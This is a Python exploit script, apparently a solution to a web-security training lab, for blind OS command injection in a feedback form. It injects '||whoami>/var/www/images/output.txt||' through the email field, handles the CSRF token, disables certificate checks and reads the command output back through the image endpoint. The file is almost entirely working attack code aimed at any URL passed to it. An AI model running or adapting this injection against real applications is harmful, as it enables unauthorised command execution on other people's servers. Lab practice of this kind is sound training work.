"""
    Lab: Blind OS command injection with output redirection

    This script exploits a blind OS command injection vulnerability using output redirection.

    This lab contains a blind OS command injection vulnerability in the feedback function.
    The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
    /var/www/images/
    The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
    To solve the lab, execute the whoami command and retrieve the output.

    Steps:
    1. Send feedback with the email parameter set to: ||whoami>/var/www/images/output.txt||
    2. Fetch /image?filename=output.txt to retrieve the command output

    Author: N00BCYB0T
"""

import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://target-lab.com)')
    parser.add_argument('--proxy', help='HTTP Proxy (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    url = args.url.rstrip('/')
    session = requests.Session()
    if args.proxy:
        session.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    session.verify = False

    # Step 1: Send feedback with output redirection payload
    feedback_url = f"{url}/feedback/submit"
    csrf_token = get_csrf(session, f"{url}/feedback")
    data = {
        "name": "attacker",
        "email": "||whoami>/var/www/images/output.txt||",
        "subject": "test",
        "message": "test",
        "csrf": csrf_token
    }
    print(f"{Fore.YELLOW}[*] Sending feedback with output redirection payload...{Fore.RESET}")
    r = session.post(feedback_url, data=data)
    print(f"{Fore.GREEN}[+] Feedback submitted. Status code: {r.status_code}{Fore.RESET}")

    # Step 2: Retrieve the output from the injected command
    image_url = f"{url}/image?filename=output.txt"
    print(f"{Fore.YELLOW}[*] Fetching output from {image_url}...{Fore.RESET}")
    r = session.get(image_url)
    output = r.text.strip()
    print(f"{Fore.GREEN}[+] whoami output: {output}{Fore.RESET}")

def get_csrf(session, page_url):
    r = session.get(page_url)
    m = re.search(r'csrf" value="(.+?)"', r.text)
    if not m:
        print(f"{Fore.RED}[-] CSRF token not found on feedback page{Fore.RESET}")
        exit(1)
    return m.group(1)

if __name__ == "__main__":
    main()